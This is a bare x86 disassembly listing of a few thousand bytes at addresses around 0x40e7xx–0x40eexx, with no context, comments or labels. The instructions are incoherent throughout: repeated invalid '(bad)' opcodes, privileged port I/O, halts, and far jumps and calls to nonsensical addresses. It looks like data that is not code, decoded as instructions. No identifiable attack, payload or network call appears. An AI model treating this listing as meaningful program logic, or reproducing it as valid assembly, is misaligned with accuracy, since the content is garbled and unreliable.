  40e721:	add    DWORD PTR [ecx],0x51
  40e724:	push   cs
  40e725:	dec    ebx
  40e726:	hlt    
  40e727:	mov    ds:0x8a2a2004,al
  40e72c:	and    BYTE PTR [edx],al
  40e72e:	mov    ebp,0xfa3f3d2e
  40e733:	sbb    edx,ebx
  40e735:	sub    ch,BYTE PTR [edx+0x553d1103]
  40e73b:	cwde   
  40e73c:	stc    
  40e73d:	mov    ebx,0x5748201f
  40e742:	pop    ebx
  40e743:	mov    edi,0x249ea9ce
  40e748:	push   edx
  40e749:	add    DWORD PTR [eax+0x2f],0xe2e757fa
  40e750:	hlt    
  40e751:	pop    ebp
  40e752:	fist   DWORD PTR [ebx-0x54]
  40e755:	int    0x77
  40e757:	in     al,0xe6
  40e759:	push   cs
  40e75a:	add    BYTE PTR [ebx+0x54],cl
  40e75d:	pop    ebp
  40e75e:	push   es
  40e75f:	daa    
  40e760:	add    DWORD PTR [bx+0x33],0xffffffe0
  40e765:	pusha  
  40e766:	adc    al,BYTE PTR [esi+0x45f30bf8]
  40e76c:	fisttp QWORD PTR [ecx-0xc5d210e]
  40e772:	mov    edi,DWORD PTR [edi+0x5d]
  40e775:	sub    al,BYTE PTR [ecx+0x76]
  40e778:	mov    al,ds:0xa39dde93
  40e77d:	xor    al,BYTE PTR [ebx+0x73]
  40e780:	add    BYTE PTR [ebp-0x2c672620],bh
  40e786:	add    DWORD PTR [esi],eax
  40e788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e789:	imul   edi,esi,0x50af78b
  40e78f:	pusha  
  40e790:	push   edi
  40e791:	cmp    BYTE PTR [esi+0x73],cl
  40e794:	scas   al,BYTE PTR es:[edi]
  40e795:	cs scas al,BYTE PTR es:[edi]
  40e797:	sub    dh,al
  40e799:	pop    edi
  40e79a:	aas    
  40e79b:	mov    esi,0x7b2bfa3a
  40e7a0:	xor    al,0x9
  40e7a2:	lahf   
  40e7a3:	daa    
  40e7a4:	test   BYTE PTR [ecx-0x2341190],ch
  40e7aa:	lods   al,BYTE PTR ds:[esi]
  40e7ab:	adc    eax,0xb98d2594
  40e7b0:	pop    ds
  40e7b1:	jb     0x40e745
  40e7b3:	dec    ecx
  40e7b4:	xlat   BYTE PTR ds:[ebx]
  40e7b5:	adc    ch,BYTE PTR [edx+0x33]
  40e7b8:	test   BYTE PTR [eax],0x3b
  40e7bb:	cdq    
  40e7bc:	je     0x40e803
  40e7be:	add    al,0x94
  40e7c0:	aam    0x96
  40e7c2:	push   eax
  40e7c3:	outs   dx,DWORD PTR ds:[esi]
  40e7c4:	mov    ebx,esi
  40e7c6:	mov    eax,ds:0x7c458fd2
  40e7cb:	popa   
  40e7cc:	jp     0x40e7b6
  40e7ce:	out    dx,eax
  40e7cf:	push   esp
  40e7d0:	inc    eax
  40e7d1:	cmc    
  40e7d2:	or     al,0xd3
  40e7d4:	and    esp,edi
  40e7d6:	pop    ebx
  40e7d7:	adc    al,0x2
  40e7d9:	push   esp
  40e7da:	inc    edi
  40e7db:	inc    ebx
  40e7dc:	lods   eax,DWORD PTR ds:[esi]
  40e7dd:	(bad)  
  40e7df:	or     BYTE PTR [ebx-0x72c4e92d],cl
  40e7e5:	push   ds
  40e7e6:	and    ecx,ecx
  40e7e8:	jle    0x40e7b1
  40e7ea:	and    DWORD PTR [edx],eax
  40e7ec:	lods   al,BYTE PTR ds:[esi]
  40e7ed:	inc    esi
  40e7ee:	stc    
  40e7ef:	pop    ebx
  40e7f0:	xchg   esi,eax
  40e7f1:	out    0x57,eax
  40e7f3:	xor    DWORD PTR [esi+0x4],ebx
  40e7f6:	jle    0x40e792
  40e7f8:	(bad)  
  40e7f9:	in     al,0xb7
  40e7fb:	inc    esp
  40e7fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7fd:	inc    eax
  40e7fe:	ins    DWORD PTR es:[edi],dx
  40e7ff:	pop    ecx
  40e800:	mov    dh,0xef
  40e802:	(bad)  
  40e803:	int    0xae
  40e805:	repnz fcmovnbe st,st(1)
  40e808:	rol    ah,cl
  40e80a:	mov    al,0xf2
  40e80c:	pop    esp
  40e80d:	dec    edi
  40e80e:	mov    ebp,DWORD PTR [edx-0x13]
  40e811:	xor    BYTE PTR [esi],0xb6
  40e814:	imul   edx,esi,0xfffffffd
  40e817:	(bad)  
  40e818:	ficom  WORD PTR [eax+0x87aafc9]
  40e81e:	add    edx,esp
  40e820:	vsqrtss xmm3,xmm4,DWORD PTR [edx-0x2fd50384]
  40e828:	sub    edx,ebx
  40e82a:	push   0xffffffab
  40e82c:	add    eax,0x341fd7b7
  40e831:	dec    esp
  40e832:	sbb    dl,0xca
  40e835:	arpl   cx,bx
  40e837:	es loop 0x40e884
  40e83a:	or     edi,DWORD PTR [ebx+0x2bdac6bb]
  40e840:	push   eax
  40e841:	stos   DWORD PTR es:[edi],eax
  40e842:	add    al,0xa6
  40e844:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e845:	int3   
  40e846:	xor    ebp,0x847af320
  40e84c:	add    dl,BYTE PTR [edx-0x6d]
  40e84f:	sbb    BYTE PTR [ebx*4-0x4b7d741c],0xfb
  40e857:	inc    BYTE PTR [eax]
  40e859:	sub    al,0xed
  40e85b:	jmp    0xd11d:0x9fcd757d
  40e862:	or     BYTE PTR [ecx+0x50f89642],cl
  40e868:	not    BYTE PTR [eax-0xf]
  40e86b:	lods   eax,DWORD PTR ds:[esi]
  40e86c:	(bad)  
  40e86d:	adc    al,al
  40e86f:	in     al,0xfd
  40e871:	jmp    0x40e802
  40e873:	pop    ss
  40e874:	inc    ecx
  40e875:	(bad)  
  40e876:	push   0xffffffd2
  40e878:	mov    ch,0x1f
  40e87a:	bound  esi,QWORD PTR [edx]
  40e87c:	neg    BYTE PTR [edi+eiz*4]
  40e87f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e880:	dec    BYTE PTR [esi+0x2c8f7f79]
  40e886:	int    0xdc
  40e888:	jnp    0x40e903
  40e88a:	mov    ebp,edx
  40e88c:	xor    esi,ecx
  40e88e:	rcr    DWORD PTR [ebp+0x94fd6e3],1
  40e894:	and    bl,dl
  40e896:	mov    esi,0x18b3733
  40e89b:	adc    DWORD PTR [eax+eax*1+0x1e180a78],ebx
  40e8a2:	stos   DWORD PTR es:[edi],eax
  40e8a3:	(bad)  [edx-0x71]
  40e8a6:	xor    al,0xe0
  40e8a8:	push   ds
  40e8a9:	ins    DWORD PTR es:[edi],dx
  40e8aa:	add    BYTE PTR [edx+eax*4-0x2de2f137],bl
  40e8b1:	xor    dl,ah
  40e8b3:	out    dx,eax
  40e8b4:	(bad)  
  40e8b5:	cmc    
  40e8b6:	pop    ecx
  40e8b7:	lods   al,BYTE PTR ds:[esi]
  40e8b8:	mov    ds:0x3255828b,eax
  40e8bd:	or     al,BYTE PTR [edx+0x10b2456a]
  40e8c3:	fidiv  WORD PTR [ecx]
  40e8c6:	es mov bl,0x21
  40e8c9:	stos   DWORD PTR es:[edi],eax
  40e8ca:	rcr    bl,0x5
  40e8cd:	and    DWORD PTR [ebx+0x1c0e1ace],0x32
  40e8d4:	das    
  40e8d5:	aam    0x25
  40e8d7:	sbb    eax,0x2a9ae162
  40e8dc:	cmp    ecx,eax
  40e8de:	xlat   BYTE PTR ds:[ebx]
  40e8df:	loopne 0x40e91f
  40e8e1:	mov    ds:0x61a981f5,al
  40e8e6:	ins    DWORD PTR es:[edi],dx
  40e8e7:	arpl   bx,si
  40e8e9:	jmp    0x40e93c
  40e8eb:	in     al,dx
  40e8ec:	popa   
  40e8ed:	sub    eax,DWORD PTR [ecx]
  40e8ef:	adc    dh,BYTE PTR [esi-0x27]
  40e8f2:	cmp    dl,bl
  40e8f4:	shl    ebp,cl
  40e8f6:	enter  0x5809,0x9e
  40e8fa:	ins    DWORD PTR es:[edi],dx
  40e8fb:	fwait
  40e8fc:	cmp    esp,eax
  40e8fe:	lds    esp,FWORD PTR [edi-0x24]
  40e901:	jl     0x40e967
  40e903:	cdq    
  40e904:	rol    DWORD PTR [edi-0x2a],0x73
  40e908:	out    dx,al
  40e909:	jns    0x40e8e9
  40e90b:	xor    DWORD PTR [eax-0x3e4414c1],edx
  40e911:	stos   DWORD PTR es:[edi],eax
  40e912:	shl    ebx,cl
  40e914:	aad    0xab
  40e916:	mov    DWORD PTR [edi-0x380d8b24],ebp
  40e91c:	jge    0x40e917
  40e91e:	and    al,0xb1
  40e920:	xor    ebp,ebx
  40e922:	jb     0x40e943
  40e924:	mov    ebp,esp
  40e926:	mov    dl,0x90
  40e928:	scas   eax,DWORD PTR es:[edi]
  40e929:	cmp    DWORD PTR [eax+0xc27577f],edx
  40e92f:	jmp    0x40e8c9
  40e931:	fst    st(5)
  40e933:	pop    ds
  40e934:	push   edi
  40e935:	cmp    DWORD PTR [ebx+0x52],edx
  40e938:	cmp    al,0xc3
  40e93a:	pop    edx
  40e93b:	adc    al,0x81
  40e93d:	mov    bh,BYTE PTR [ebx-0x13af3b9d]
  40e943:	jl     0x40e8c5
  40e945:	icebp  
  40e946:	push   DWORD PTR [edi+0x12]
  40e949:	xor    al,BYTE PTR ds:0xff326651
  40e94f:	mov    ebx,0x3d68e101
  40e954:	sbb    eax,0x8eb36ac3
  40e959:	cmp    al,0xff
  40e95b:	je     0x40e914
  40e95d:	add    BYTE PTR [ebp+0x14fa0a66],ch
  40e963:	fst    QWORD PTR [ecx+eax*8]
  40e966:	sub    ebx,DWORD PTR [edx+0x79083fbf]
  40e96c:	add    al,0x39
  40e96e:	add    al,0xc4
  40e970:	mov    cl,0xb1
  40e972:	mov    ecx,0x4e947c03
  40e977:	call   0xbcc53140
  40e97c:	fsubr  st,st(0)
  40e97e:	or     dl,BYTE PTR [ebx]
  40e980:	mov    bh,0xad
  40e982:	icebp  
  40e983:	xchg   BYTE PTR [ebp+ebp*4-0x4b],dh
  40e987:	cld    
  40e988:	les    esi,FWORD PTR [edx-0x71aa77d5]
  40e98e:	jae    0x40e9dd
  40e990:	adc    eax,DWORD PTR [ecx]
  40e992:	add    al,0x8e
  40e994:	pop    ecx
  40e995:	dec    edi
  40e996:	jg     0x40e9fe
  40e998:	jle    0x40e966
  40e99a:	inc    eax
  40e99b:	mov    edi,0x3bf2a253
  40e9a0:	or     al,0x8
  40e9a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9a3:	imul   edi,edi,0x7b
  40e9a6:	rcr    BYTE PTR [ecx+0x52],1
  40e9a9:	lods   eax,DWORD PTR es:[esi]
  40e9ab:	push   ebp
  40e9ac:	inc    edi
  40e9ad:	(bad)  
  40e9ae:	cs mov dh,0xb5
  40e9b1:	retf   0x6554
  40e9b4:	dec    ecx
  40e9b5:	(bad)  
  40e9b6:	pop    esp
  40e9b7:	pop    edi
  40e9b8:	mov    ah,0xbf
  40e9ba:	cmp    ah,bh
  40e9bc:	sbb    eax,0x93b39134
  40e9c1:	pop    ss
  40e9c2:	in     eax,0x8
  40e9c4:	adc    BYTE PTR [ebp+0x51c4599d],0x2c
  40e9cb:	pop    ecx
  40e9cc:	push   ebp
  40e9cd:	add    dl,BYTE PTR [eax+0x33]
  40e9d0:	sti    
  40e9d1:	aad    0xf2
  40e9d3:	jo     0x40ea11
  40e9d5:	arpl   ax,dx
  40e9d7:	in     eax,0xbb
  40e9d9:	or     DWORD PTR [ecx+0x2d72f40f],esi
  40e9df:	sbb    al,0x83
  40e9e1:	adc    al,0x23
  40e9e3:	add    eax,0xf52450d8
  40e9e8:	ja     0x40e990
  40e9ea:	dec    edi
  40e9eb:	sub    ch,BYTE PTR [eax+0x1f652fac]
  40e9f1:	or     eax,0x969291f2
  40e9f6:	add    eax,0x6a5d4f29
  40e9fb:	imul   ebx,esp,0xffffffe8
  40e9fe:	(bad)  
  40e9ff:	mov    edx,?
  40ea01:	test   eax,0x10c66ec9
  40ea06:	rcr    BYTE PTR [edi],cl
  40ea08:	les    esi,FWORD PTR [ebx+0x6f7f3add]
  40ea0e:	lods   eax,DWORD PTR ds:[esi]
  40ea0f:	ret    
  40ea10:	test   DWORD PTR [edx+0x15f98e0e],edi
  40ea16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea17:	mov    ss,WORD PTR [eax+edi*1-0x57228741]
  40ea1e:	dec    eax
  40ea1f:	mov    ds:0x20c67342,eax
  40ea24:	xor    BYTE PTR [edx+0x30],ah
  40ea27:	jl     0x40ea49
  40ea29:	and    al,0xf
  40ea2b:	push   esp
  40ea2c:	retf   0xf398
  40ea2f:	jo     0x40ea55
  40ea31:	push   edx
  40ea32:	retf   0xeb0f
  40ea35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea36:	adc    eax,0x34a3906
  40ea3b:	push   ds
  40ea3c:	and    bl,BYTE PTR [edx]
  40ea3e:	push   cs
  40ea3f:	jl     0x40e9c6
  40ea41:	adc    cl,BYTE PTR [edx-0x6ec6bdcf]
  40ea47:	push   ss
  40ea48:	out    dx,eax
  40ea49:	retf   0x204e
  40ea4c:	les    ebx,FWORD PTR [edx]
  40ea4e:	ret    
  40ea4f:	mov    esi,0x227ac03c
  40ea54:	inc    ebp
  40ea55:	pop    ds
  40ea56:	shl    BYTE PTR [ebp-0x1a],0x48
  40ea5a:	ret    0x2d84
  40ea5d:	clc    
  40ea5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea5f:	test   DWORD PTR [ebx],edi
  40ea61:	inc    edx
  40ea62:	ins    BYTE PTR es:[edi],dx
  40ea63:	repz dec ebx
  40ea65:	mov    ds:0x3d5c403d,eax
  40ea6a:	popa   
  40ea6b:	mov    cl,0x1e
  40ea6d:	cmp    edi,edi
  40ea6f:	push   ebx
  40ea70:	cmp    DWORD PTR [ebp+0x2a3b55e6],eax
  40ea76:	pop    edx
  40ea77:	lds    esi,FWORD PTR [edx+0x582d3a21]
  40ea7d:	mov    ds:0xb2dfd808,eax
  40ea82:	lods   eax,DWORD PTR ds:[esi]
  40ea83:	ja     0x40ea67
  40ea85:	mov    cl,BYTE PTR [edx]
  40ea87:	push   esi
  40ea88:	sub    ah,BYTE PTR [ecx-0x7b]
  40ea8b:	(bad)  
  40ea8c:	inc    esp
  40ea8d:	mov    ds:0x6786d6ab,al
  40ea92:	ficomp WORD PTR [ebx]
  40ea94:	sbb    DWORD PTR [ebx-0x6d3f5414],esp
  40ea9a:	push   ss
  40ea9b:	inc    edi
  40ea9c:	mov    ebx,0x5e31fcd5
  40eaa1:	push   ebp
  40eaa2:	jno    0x40ea39
  40eaa4:	ror    BYTE PTR [edi+ecx*2-0x50],1
  40eaa8:	mov    dl,0x9f
  40eaaa:	dec    esp
  40eaab:	dec    ebx
  40eaac:	add    edi,DWORD PTR [esp+0x4465a10c]
  40eab3:	(bad)  
  40eab4:	mov    ah,0x47
  40eab6:	(bad)
  40eaba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eabb:	lahf   
  40eabc:	sub    al,bh
  40eabe:	inc    ebx
  40eabf:	jne    0x40eae4
  40eac1:	loop   0x40ea56
  40eac3:	xchg   ebp,eax
  40eac4:	repz push edx
  40eac6:	fsubr  QWORD PTR [esi+0x1]
  40eac9:	aam    0xe0
  40eacb:	cmp    al,0x7a
  40eacd:	inc    esp
  40eace:	jnp    0x40eb13
  40ead0:	mov    dl,0x7
  40ead2:	test   BYTE PTR [ebx],bh
  40ead4:	sti    
  40ead5:	pop    DWORD PTR [edx]
  40ead7:	mov    ah,0x4a
  40ead9:	dec    ecx
  40eada:	cwde   
  40eadb:	fmul   st(5),st
  40eadd:	sub    dl,BYTE PTR [edi+0x229755f2]
  40eae3:	sahf   
  40eae4:	test   eax,0x2e326fea
  40eae9:	in     eax,dx
  40eaea:	out    0x97,al
  40eaec:	int3   
  40eaed:	out    0x3c,al
  40eaef:	push   esp
  40eaf0:	push   ebp
  40eaf1:	xchg   esp,eax
  40eaf2:	ficomp DWORD PTR [ecx-0x7ed6f16c]
  40eaf8:	or     DWORD PTR [ebx],edi
  40eafa:	cmp    al,BYTE PTR [edi-0x7a67477d]
  40eb00:	push   0xcae9a42a
  40eb05:	clc    
  40eb06:	push   0x5a5f48f3
  40eb0b:	pop    es
  40eb0c:	sub    DWORD PTR [ebp+0x5d977a1d],eax
  40eb12:	mov    BYTE PTR [ecx+0x36],0x1b
  40eb16:	or     DWORD PTR [eax-0x7c],edi
  40eb19:	mov    edi,0xbdd04192
  40eb1e:	pop    esi
  40eb1f:	adc    cl,0x54
  40eb22:	inc    esi
  40eb23:	mov    ch,0xb8
  40eb25:	mov    eax,es
  40eb27:	lahf   
  40eb28:	(bad)  
  40eb29:	xlat   BYTE PTR ds:[ebx]
  40eb2a:	popa   
  40eb2b:	cmp    edi,DWORD PTR [ecx+0x70]
  40eb2e:	push   0xc7b4dd00
  40eb33:	adc    eax,0x4e6ba558
  40eb38:	mov    eax,ds:0xad1a82fa
  40eb3d:	and    edi,DWORD PTR ds:[edi-0x218b3502]
  40eb44:	add    dl,0xa
  40eb47:	cmp    DWORD PTR [edx+0x4a],esp
  40eb4a:	jmp    0x456f89ee
  40eb4f:	test   di,bp
  40eb52:	and    BYTE PTR [ebx],0x7f
  40eb55:	cli    
  40eb56:	mov    ecx,DWORD PTR [ebx+ebx*1+0x6b]
  40eb5a:	(bad)  
  40eb5b:	repz inc ecx
  40eb5d:	mov    cl,ah
  40eb5f:	push   esi
  40eb60:	xchg   edx,eax
  40eb61:	xchg   ebp,eax
  40eb62:	loope  0x40eb7d
  40eb64:	cmp    BYTE PTR [ebx+ecx*1+0x6d],al
  40eb68:	mov    DWORD PTR [esi],ebx
  40eb6a:	into   
  40eb6b:	bound  ecx,QWORD PTR [eax-0x65]
  40eb6e:	jbe    0x40eafa
  40eb70:	pop    edx
  40eb71:	dec    esp
  40eb72:	push   ss
  40eb73:	pop    ebx
  40eb74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb75:	out    dx,al
  40eb76:	push   0x38
  40eb78:	rol    BYTE PTR [esi-0xcbeb920],cl
  40eb7e:	ja     0x40ebf2
  40eb80:	push   esp
  40eb81:	lods   al,BYTE PTR ds:[esi]
  40eb82:	add    bl,ah
  40eb84:	ficomp DWORD PTR [ecx-0x47b1824c]
  40eb8a:	ss xchg esi,eax
  40eb8c:	pop    ebp
  40eb8d:	push   ecx
  40eb8e:	push   ecx
  40eb8f:	repnz add al,0x82
  40eb92:	or     DWORD PTR [ecx+0x5fcf964d],esp
  40eb98:	clc    
  40eb99:	cld    
  40eb9a:	push   esp
  40eb9b:	adc    al,0x2b
  40eb9d:	jp     0x40ebc6
  40eb9f:	or     dx,WORD PTR [ecx]
  40eba2:	sbb    eax,0xb838e2bb
  40eba7:	inc    esp
  40eba8:	mov    dh,0xb4
  40ebaa:	repnz std 
  40ebac:	mov    ch,0x14
  40ebae:	inc    esp
  40ebaf:	or     al,0x12
  40ebb1:	fdivp  st(5),st
  40ebb3:	lds    eax,FWORD PTR [ecx-0xe]
  40ebb6:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40ebb8:	popf   
  40ebb9:	std    
  40ebba:	inc    esp
  40ebbb:	mov    edx,0x4c6c05a6
  40ebc0:	xchg   ebx,eax
  40ebc1:	pop    edx
  40ebc2:	jmp    FWORD PTR [esi+esi*1]
  40ebc5:	mov    bh,0xdc
  40ebc7:	stos   BYTE PTR es:[edi],al
  40ebc8:	or     BYTE PTR [ebx+0x4ce9f373],al
  40ebce:	popf   
  40ebcf:	fldcw  WORD PTR [ebp-0x39]
  40ebd2:	pop    esp
  40ebd3:	lods   al,BYTE PTR ds:[esi]
  40ebd4:	sbb    al,bl
  40ebd6:	mov    bl,0xdb
  40ebd8:	mov    al,0x59
  40ebda:	mov    edx,edx
  40ebdc:	mov    gs,WORD PTR [eax]
  40ebde:	lods   al,BYTE PTR ds:[esi]
  40ebdf:	in     al,dx
  40ebe0:	mov    ch,0x9c
  40ebe2:	push   ds
  40ebe3:	lahf   
  40ebe4:	ficomp DWORD PTR [ebx-0x27]
  40ebe7:	std    
  40ebe8:	out    0xdf,al
  40ebea:	mov    ecx,0x3602ef0
  40ebef:	fs cmp eax,edi
  40ebf2:	loopne 0x40eb87
  40ebf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebf5:	(bad)  
  40ebf6:	cdq    
  40ebf7:	pop    es
  40ebf8:	iret   
  40ebf9:	test   eax,0x4c076fef
  40ebfe:	outs   dx,BYTE PTR ds:[esi]
  40ebff:	adc    al,BYTE PTR [ecx+0x7f]
  40ec02:	shl    dh,cl
  40ec04:	hlt    
  40ec05:	mov    edx,fs
  40ec07:	mov    dl,0x3e
  40ec09:	mov    al,ds:0x37bcec9c
  40ec0e:	aas    
  40ec0f:	dec    ebp
  40ec10:	inc    ecx
  40ec11:	mov    bl,0xfa
  40ec13:	pop    edx
  40ec14:	in     al,dx
  40ec15:	sub    eax,0xd2375a18
  40ec1a:	jbe    0x40eba8
  40ec1c:	inc    ecx
  40ec1d:	push   ebx
  40ec1e:	mov    ebx,0x6a8ca613
  40ec23:	inc    DWORD PTR [ebx+0x15fa7701]
  40ec29:	call   0x7c91:0x6c51ab7
  40ec30:	pop    es
  40ec31:	push   ss
  40ec32:	xchg   esp,eax
  40ec33:	neg    edi
  40ec35:	mov    ds:0x8b9ef640,al
  40ec3a:	cmp    eax,0xc8d4caaa
  40ec3f:	cmp    DWORD PTR [ebp+0x7ad586fb],edi
  40ec45:	or     dh,cl
  40ec47:	jl     0x40ec0b
  40ec49:	xor    BYTE PTR [edi+0x3cf76fdb],bl
  40ec4f:	fwait
  40ec50:	xchg   ebx,eax
  40ec51:	xchg   ecx,eax
  40ec52:	pushfw 
  40ec54:	out    0x14,eax
  40ec56:	pop    ebp
  40ec57:	rcl    BYTE PTR [ecx-0x66],0xbf
  40ec5b:	add    al,0x1
  40ec5d:	out    dx,eax
  40ec5e:	add    al,0x14
  40ec60:	div    ch
  40ec62:	fsub   QWORD PTR [ebx+0x3532de22]
  40ec68:	and    ebp,DWORD PTR [ebx+ecx*8+0x2a1126bd]
  40ec6f:	ret    
  40ec70:	sbb    eax,0x2557177d
  40ec75:	mov    al,ds:0x293a5a6
  40ec7a:	mov    ?,WORD PTR [ebp-0xc463372]
  40ec80:	xchg   esi,eax
  40ec81:	enterw 0xe13e,0xac
  40ec86:	clc    
  40ec87:	inc    esi
  40ec88:	icebp  
  40ec89:	sub    DWORD PTR [esi],esi
  40ec8b:	inc    DWORD PTR [eax+0x17b55e9b]
  40ec91:	cmc    
  40ec92:	adc    DWORD PTR [ecx],edi
  40ec94:	sbb    esp,DWORD PTR [ecx+edi*8-0x48]
  40ec98:	out    0x7a,al
  40ec9a:	gs loop 0x40ecaa
  40ec9d:	sbb    DWORD PTR [eax+ebx*1-0x6c3c19ba],0x66
  40eca5:	scas   eax,DWORD PTR es:[edi]
  40eca6:	mov    ds:0x664a5a4d,al
  40ecab:	in     al,0xcb
  40ecad:	and    ecx,esp
  40ecaf:	mov    BYTE PTR [edi-0x40],cl
  40ecb2:	add    al,0x2e
  40ecb4:	mov    ah,0x25
  40ecb6:	jge    0x40ec8e
  40ecb8:	pop    es
  40ecb9:	clc    
  40ecba:	jge    0x40ed39
  40ecbc:	fcom   QWORD PTR [edi+edx*2+0x3f10b7ff]
  40ecc3:	mov    ebp,0x8b12de68
  40ecc8:	popf   
  40ecc9:	outs   dx,DWORD PTR ds:[esi]
  40ecca:	inc    edx
  40eccb:	rcr    DWORD PTR [edi-0x652cbb0e],0x4e
  40ecd2:	inc    edx
  40ecd3:	fstp   TBYTE PTR [esi-0x3cbedbc7]
  40ecd9:	popf   
  40ecda:	rcr    BYTE PTR [ebx+0x20c159a6],1
  40ece0:	retf   0xfb5e
  40ece3:	jg     0x40ecc9
  40ece5:	adc    DWORD PTR [esi-0x4df5d6e1],esp
  40eceb:	in     eax,0xdc
  40eced:	push   ds
  40ecee:	imul   edx,esi,0x8596f1e5
  40ecf4:	inc    esp
  40ecf5:	fidiv  WORD PTR [edx]
  40ecf7:	inc    ebp
  40ecf8:	sub    DWORD PTR [ebp-0x76],eax
  40ecfb:	data16 test BYTE PTR [ebp+eiz*4-0x5e0ee4c2],dl
  40ed03:	pushf  
  40ed04:	fld    TBYTE PTR [ebx+0xacd7d10]
  40ed0a:	mov    ecx,0x942f6d2a
  40ed0f:	in     al,dx
  40ed10:	push   esi
  40ed11:	and    esp,DWORD PTR [edx+0xea3131]
  40ed17:	jmp    0x40ed5d
  40ed19:	push   es
  40ed1a:	pop    ds
  40ed1b:	jecxz  0x40ecf7
  40ed1d:	clc    
  40ed1e:	in     al,0x1f
  40ed20:	push   ds
  40ed21:	jg     0x40ed75
  40ed23:	mov    eax,ds:0x8103b88e
  40ed28:	add    edi,DWORD PTR [edi-0x17]
  40ed2b:	cmp    esp,DWORD PTR [eax-0x70]
  40ed2e:	inc    ebx
  40ed2f:	lods   eax,DWORD PTR ds:[esi]
  40ed30:	push   cs
  40ed31:	les    ebx,FWORD PTR [esi+0x5e05bb9b]
  40ed37:	ds push 0x12d7b270
  40ed3d:	mov    bl,0x76
  40ed3f:	stc    
  40ed40:	lods   al,BYTE PTR ds:[esi]
  40ed41:	mov    cl,0x81
  40ed43:	retf   0x43c6
  40ed46:	adc    ebx,edx
  40ed48:	xchg   esi,eax
  40ed49:	adc    eax,DWORD PTR [esi+0x5e3afeed]
  40ed4f:	fidivr WORD PTR [ebx+0x5f]
  40ed52:	inc    ecx
  40ed53:	cmc    
  40ed54:	cmp    eax,0x7bc0c844
  40ed59:	in     al,dx
  40ed5a:	call   0xb1ff:0x5ff67e82
  40ed61:	add    eax,0xc0206fc6
  40ed66:	imul   edx,edx,0xfffffffd
  40ed69:	jle    0x40ede0
  40ed6b:	inc    ebp
  40ed6c:	loop   0x40ed72
  40ed6e:	push   esp
  40ed6f:	test   BYTE PTR [ecx-0x3b8e86ce],dh
  40ed75:	jb     0x40ed0c
  40ed77:	mov    ch,0x10
  40ed79:	mov    ds:0x80ab56f0,eax
  40ed7e:	jns    0x40ed1c
  40ed80:	push   edx
  40ed81:	push   0xffffffed
  40ed83:	sbb    eax,0x62da14bb
  40ed88:	neg    DWORD PTR [ebp-0x59]
  40ed8b:	cld    
  40ed8c:	push   0xffffffc9
  40ed8e:	fcom   DWORD PTR [edi+0x16a18c8e]
  40ed94:	dec    edi
  40ed95:	dec    ebp
  40ed96:	fild   QWORD PTR [eax]
  40ed98:	sub    dh,BYTE PTR [esp+ebp*2-0x72712a81]
  40ed9f:	xchg   esp,eax
  40eda0:	or     dl,dh
  40eda2:	test   eax,0xc3d3a48b
  40eda7:	jmp    0x40edfc
  40eda9:	xchg   esp,eax
  40edaa:	popa   
  40edab:	imul   esp,esp,0x33aa15e3
  40edb1:	and    BYTE PTR [ecx+0x4a30e39f],al
  40edb7:	aas    
  40edb8:	repz leave 
  40edba:	in     eax,0xea
  40edbc:	enter  0x175d,0x42
  40edc0:	shl    DWORD PTR [edi-0x4883ad83],0x58
  40edc7:	mov    edx,0x7a2d435b
  40edcc:	mov    ds:0x41d0b304,al
  40edd1:	add    DWORD PTR [esi+0x46],ecx
  40edd4:	clc    
  40edd5:	adc    al,0xfa
  40edd7:	sub    eax,0x18679ae8
  40eddc:	daa    
  40eddd:	add    eax,0x19d1fdd7
  40ede2:	je     0x40ee23
  40ede4:	mov    esi,0x9556a9de
  40ede9:	das    
  40edea:	push   0xffffffd1
  40edec:	repz or bl,dl
  40edef:	scas   eax,DWORD PTR es:[edi]
  40edf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edf1:	mov    edx,0x98be1e5d
  40edf6:	and    al,0x62
  40edf8:	adc    ecx,DWORD PTR [esi+edx*4-0x30]
  40edfc:	(bad)  
  40edfd:	mov    edx,0xb46a559f
  40ee02:	ror    BYTE PTR [edx],1
  40ee04:	or     eax,0xf2438b31
  40ee09:	push   ss
  40ee0a:	in     al,0x20
  40ee0c:	add    al,0xd2
  40ee0e:	fcmovb st,st(7)
  40ee10:	mov    edi,0x95565710
  40ee15:	mov    ecx,0x646a26b6
  40ee1a:	les    esi,FWORD PTR [eax+0x31]
  40ee1d:	call   FWORD PTR [ebx]
  40ee1f:	inc    edi
  40ee20:	mov    ah,0x83
  40ee22:	adc    al,dl
  40ee24:	lea    edi,[esi-0x49eb4927]
  40ee2a:	shl    DWORD PTR [ecx-0x67175127],cl
  40ee30:	(bad)  
  40ee31:	inc    ebp
  40ee32:	sti    
  40ee33:	and    BYTE PTR [ecx-0x7f],dh
  40ee36:	jge    0x40ee41
  40ee38:	repz jbe 0x40edc5
  40ee3b:	pop    ds
  40ee3c:	push   0x6d
  40ee3e:	inc    esp
  40ee3f:	loope  0x40ee23
  40ee41:	jns    0x40ee2c
  40ee43:	sbb    ah,BYTE PTR [edi]
  40ee45:	cdq    
  40ee46:	imul   ecx,DWORD PTR [esi],0x7f
  40ee49:	sub    eax,0xe164e24a
  40ee4e:	inc    ebp
  40ee4f:	(bad)  
  40ee50:	imul   ecx,DWORD PTR [edi+0x7f],0xd3ee066a
  40ee57:	pop    esi
  40ee58:	pop    ebx
  40ee59:	inc    edx
  40ee5a:	and    cl,ch
  40ee5c:	cmp    DWORD PTR [ebp+0x612cfa67],esi
  40ee62:	aam    0x11
  40ee64:	sbb    DWORD PTR [ecx],esi
  40ee66:	int    0xf6
  40ee68:	jg     0x40ee33
  40ee6a:	inc    BYTE PTR [eax+edi*1]
  40ee6d:	mov    ebp,0x13fcfefe
  40ee72:	jno    0x40eeae
  40ee74:	pop    edi
  40ee75:	leave  
  40ee76:	hlt    
  40ee77:	fs inc edi
  40ee79:	push   ebx
